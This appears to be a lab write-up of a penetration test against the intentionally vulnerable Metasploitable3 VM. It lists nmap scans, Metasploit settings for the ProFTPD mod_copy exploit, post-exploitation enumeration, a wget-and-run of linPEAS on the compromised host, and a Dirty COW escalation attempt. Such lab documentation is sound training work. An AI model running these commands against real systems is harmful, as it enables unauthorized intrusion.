# 🧪 Metasploitable3 Penetration Test – Full Lab Report

## 📘 Introduction

This lab simulates a real-world penetration test against the vulnerable VM **Metasploitable3** using **Kali Linux** as the attacking machine. The goal is to perform reconnaissance, exploitation, and privilege escalation, while documenting every step through screenshots.

---

## 🛠️ Lab Setup

| Machine       | OS                    | IP Address       |
|---------------|------------------------|------------------|
| Attacker      | Kali Linux             | 172.28.128.100   |
| Target        | Metasploitable3 Ubuntu | 172.28.128.3     |

---

## 1️⃣ Scanning the Network

We use `nmap` to detect live hosts in our subnet.

```bash
nmap -sn 172.28.128.0/24
```

![Scanning the Network](screenshots/1.Scanning_Our_Network.png)

---

## 2️⃣ Scanning the Target Machine

We perform a detailed scan to identify open ports and services.

```bash
nmap -sS -sV -sC -O -Pn 172.28.128.3
```

![Scanning Target Machine](screenshots/2.Scanning_Target_Machine.png)

---

## 3️⃣ Opening Metasploit

We launch the Metasploit Framework:

```bash
msfconsole
```

![Opening Metasploit Console](screenshots/3.Opening_Msfconsole.png)

---

## 4️⃣ Discovering Vulnerabilities

We search for vulnerabilities in the ProFTPD service identified earlier.

```bash
search proftpd
```

![Vulnerability Results](screenshots/4.Vulnerability_Results.png)

---

## 5️⃣ Selecting Exploit and Setting Parameters

We choose `exploit/unix/ftp/proftpd_modcopy_exec` and configure it.

```bash
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 172.28.128.3
set LHOST 172.28.128.100
set RPORT 21
```

![Setting Exploit Options](screenshots/5.Selecting_The_Exploit_And_Setting_Parameters.png)

---

## 6️⃣ Running the Exploit

We launch the exploit to gain remote code execution.

```bash
run
```

![Running the Exploit](screenshots/6.Running_The_Exploit.png)

---

## 7️⃣ Gathering Information

We enumerate the compromised machine.

```bash
whoami
id
hostname
uname -a
```

![Gathering System Info](screenshots/7.Gathering_Information.png)

---

## 8️⃣ Downloading and Executing linPEAS

We upload and execute linPEAS for local enumeration.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![Running linPEAS](screenshots/8.Downloading_And_Starting_LinPEAS.png)

---

## 9️⃣ Privilege Escalation Opportunities

We identify Dirty COW as a potential escalation path.

![linPEAS Output](screenshots/9.Looking_At_Machine_Vulnerabilities_For_Privileges_Escalation.png)

---

## 🔟 Attempted Privilege Escalation

We attempt to exploit Dirty COW, which appears to work but doesn’t yield a root shell directly.

![Privilege Escalation Attempt](screenshots/10.Exploiting_And_Updating_Root_Privileges.png)

---

## ✅ Conclusion

- ✔️ Target identified and scanned
- ✔️ Exploit executed successfully using Metasploit
- ✔️ Post-exploitation enumeration completed
- ✔️ Privilege escalation attempted using Dirty COW
- ❗ Root access not achieved, but vector validated

This lab illustrates a full cycle of a basic penetration test in a controlled environment.
